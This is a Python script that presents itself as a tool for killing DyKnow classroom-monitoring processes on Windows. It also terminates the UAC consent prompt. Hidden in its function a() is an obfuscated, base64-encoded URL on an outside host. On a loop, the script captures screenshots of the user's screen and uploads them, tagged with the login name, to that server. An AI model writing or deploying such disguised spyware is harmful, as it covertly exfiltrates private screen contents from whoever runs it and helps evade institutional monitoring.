import os.path, subprocess, glob, time, signal, sys, threading
import urllib.request as r
import urllib.error, hashlib, hmac, base64, getpass

def restartafterdelay(t, file=__file__):
    subprocess.run(f"python -c import time, os; time.sleep({t}); os.system(\"python {file}\")")
    sys.exit()
    
def importinstall(pipname,modulename=None,update=False,**importkwargs):
    if modulename is None:
        modulename = pipname
    if not update:
        try:
            return __import__(modulename)
        except ImportError:
            pass
    os.system(rf'pip install{" --upgrade" if update else ""} {pipname}')
    restartafterdelay(1)
    return __import__(modulename)

importinstall('pillow','PIL')

pyscreeze = importinstall('pyscreeze')
wmi = importinstall('wmi')
c = wmi.WMI()


def a():
    u = base64.b64decode(b'aHR0cHM6Ly9jYXQ1LnB5dGhvbmFueXdoZXJlLmNvbS9iYWNrdXAvc3VzLw==').decode()
    try:
        if hasattr(request(u, method='HEAD'),"getcode"):
            return
        img = pyscreeze.screenshot()
        img = img.resize((int(img.size[0]/img.size[1]*340),340))
        img.save('tmp.png')
        with open('tmp.png', 'rb') as imgbytes:
            request(u+'receive/'+getpass.getuser(), imgbytes.read(), 'POST')
    except Exception as e:
        pass
    finally:
        try:
            os.unlink('tmp.png')
        except:
            pass




def request(url, data=None, method="GET", headers={}):
    robj = r.Request(url, data, method=method, headers=headers)
    try:
        d = r.urlopen(robj).read()
    except urllib.error.HTTPError as e:
        return e
    return d


dynomaindir = r"C:\Program Files\DyKnow\Cloud"
if not os.path.exists(dynomaindir):
    input("U no have Dyknow! Press enter to exit.")
    sys.exit()

checkupdates = False

data = request("https://raw.githubusercontent.com/magentapenguin/dy-no/master/nodyno.py")
try:
    with open(__file__, "rb") as f:
        filedata = f.read()
except:
    filedata = b""
y = hashlib.sha256(filedata)
if not hasattr(data, "getcode"):
    x = hashlib.sha256(data)
    if not hmac.compare_digest(x.digest(), y.digest()) and checkupdates:
        subprocess.call("python install.py")
        sys.exit()
dirs = [x for x in os.scandir(dynomaindir) if x.is_dir()]
dynodir = sorted(dirs, key=lambda x: int(x.name.replace(".","")))[0].path
ignore = ("DyKnowTest.exe","DyKnowLogSender.exe", "Demo64_32.exe","Demo32_64.exe", "dkInteractive.exe", "winProcess.exe", "MonitorStateReader.exe")
verbose = True
usednames = []


def f_old(x):
    out = subprocess.call(rf'wmic process where name="{x}" delete', shell=True)
    if verbose:
        if not out:
            print("killed",x)
        else:
            print("failed",x, "code:",out,file=sys.stderr)

def f2_old():
    stop = False
    def close(*args):
        nonlocal stop
        print("Stopping...", usednames)
        stop = True
    signal.signal(signal.SIGINT, close)
    while not stop:
        time.sleep(4)
        a()
        for x in glob.iglob(dynodir+r"\*.exe"):
           x = os.path.split(x)[1]
           if x in ignore:
               continue
           f_old(x)
           usednames.append(x)
           #print(usednames)

def f():
    for process in c.Win32_Process():
        if process.name in ('svchost.exe','pythonw.exe','unsecapp.exe'):
            continue
        for x in glob.iglob(dynodir+r"\*.exe"):
            x = os.path.split(x)[1]
            if x in ignore:
                continue
            #print(x)
            if process.name.lower() == x.lower() or process.name == "consent.exe":
                try:
                    process.Terminate()
                    print('*bonk*', process.name)
                except Exception as e:
                    print(process.name)

def f2():
    f()
    process_watcher = c.Win32_Process.watch_for("creation")
    def bgtasks():
        while True:
            time.sleep(4)
            a()

    def eeee():
        while True:
            f()
            time.sleep(1)
            
    threading.Thread(target=eeee).run()
    threading.Thread(target=bgtasks).run()
    while True:
        new_process = process_watcher()
        print(new_process)
        for x in glob.iglob(dynodir+r"\*.exe"):
            x = os.path.split(x)[1]
            if x in ignore:
                continue
            if new_process.name.lower() == x.lower() or new_process.name == "consent":
                new_process.Terminate()
                print('*bonk*', new_process.name)

if __name__ == '__main__':
    f2()
